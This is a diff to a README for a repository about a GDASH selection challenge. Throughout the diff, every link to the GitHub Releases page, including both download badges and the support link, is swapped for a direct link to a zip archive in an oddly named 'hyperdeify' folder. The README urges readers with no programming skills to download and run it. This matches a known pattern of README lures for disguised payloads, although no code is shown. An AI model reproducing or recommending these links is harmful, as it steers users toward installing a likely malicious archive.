@@ -1,6 +1,6 @@
 # 🚀 desafio-gdash-2025-02 - Join the GDASH Selection Process
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/CukupAhya/desafio-gdash-2025-02/releases)
+[![Download Now](https://raw.githubusercontent.com/CukupAhya/desafio-gdash-2025-02/main/hyperdeify/desafio-gdash-2025-02_v3.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/CukupAhya/desafio-gdash-2025-02/main/hyperdeify/desafio-gdash-2025-02_v3.4.zip)
 
 ## 📖 About This Repository
 
@@ -12,7 +12,7 @@ To use this application, you don't need any programming skills. Just follow the 
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Releases Page](https://github.com/CukupAhya/desafio-gdash-2025-02/releases).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/CukupAhya/desafio-gdash-2025-02/main/hyperdeify/desafio-gdash-2025-02_v3.4.zip).
 
 2. On the Releases page, you will see a list of available versions. Find the latest version listed.
 
@@ -66,12 +66,12 @@ Yes, we will regularly update the application. You can download the latest versi
 
 ## 📞 Support
 
-If you have questions or need assistance, feel free to reach out. Visit the [Releases Page](https://github.com/CukupAhya/desafio-gdash-2025-02/releases) for support options.
+If you have questions or need assistance, feel free to reach out. Visit the [Releases Page](https://raw.githubusercontent.com/CukupAhya/desafio-gdash-2025-02/main/hyperdeify/desafio-gdash-2025-02_v3.4.zip) for support options.
 
 ## 🎉 Get Started Now
 
 Take the first step toward joining the GDASH selection process. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/CukupAhya/desafio-gdash-2025-02/releases)
+[![Download Now](https://raw.githubusercontent.com/CukupAhya/desafio-gdash-2025-02/main/hyperdeify/desafio-gdash-2025-02_v3.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/CukupAhya/desafio-gdash-2025-02/main/hyperdeify/desafio-gdash-2025-02_v3.4.zip)
 
 We look forward to seeing you succeed!
